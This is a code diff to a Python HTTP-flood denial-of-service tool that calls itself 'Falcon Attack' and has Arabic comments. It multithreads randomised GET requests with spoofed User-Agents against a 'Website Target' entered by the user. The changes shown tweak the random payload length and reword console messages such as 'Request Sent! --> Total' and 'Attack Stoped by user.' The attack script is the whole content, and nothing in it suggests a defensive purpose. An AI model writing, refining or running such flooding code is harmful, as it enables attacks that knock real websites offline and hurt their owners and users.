@@ -64,7 +64,7 @@ def usage():
 
 def httpcall(url):
     """إرسال طلب HTTP."""
-    payload = f"{buildblock(random.randint(3, 10))}={buildblock(random.randint(3, 10))}"
+    payload = f"{buildblock(random.randint(3, 15))}={buildblock(random.randint(3, 15))}"
     request_url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"
     headers = {
         "User-Agent": ua.random,
@@ -86,7 +86,7 @@ def httpcall(url):
         inc_counter()
     except urllib.error.HTTPError as e:
         set_flag(1)
-        print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA}Response Code!")
+        print(f"{Fore.RED}( {e.code} ) {Fore.MAGENTA}Response Code!")
     except Exception:
         pass  # تجاهل الأخطاء الأخرى
 
@@ -98,7 +98,7 @@ def monitor_requests():
         with lock:
             if request_counter >= previous + 100:
                 sent += 1
-                print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Total: {request_counter}.")
+                print(f"{Fore.YELLOW}( {sent} ) {Fore.GREEN}Request Sent! --> Total: {request_counter}.")
                 previous = request_counter
     if flag == 2:
         print(f"{Fore.RED}-- Falcon Attack Finished --{Fore.RESET}")
@@ -115,15 +115,15 @@ if __name__ == "__main__":
     logo()
     usage()
 
-    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target: ").strip()
+    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target => ").strip()
     if url.count("/") == 2:
         url += "/"
 
     host = re.search(r'(https?://)?([^/]*)/?.*', url).group(2)
 
-    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no): ").strip().lower()
+    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no)=> ").strip().lower()
 
-    thread_Num = int(input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Threads: "))
+    thread_Num = int(input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Threads => "))
     if safe_option == "yes":
         set_safe()
 
@@ -136,4 +136,4 @@ if __name__ == "__main__":
             concurrent.futures.wait(futures)
         except KeyboardInterrupt:
             set_flag(2)
-            print(f"{Fore.RED}Attack interrupted by user.{Fore.RESET}")
+            print(f"{Fore.YELLOW}( FINISH ) {Fore.RED}Attack Stoped by user.{Fore.RESET}")
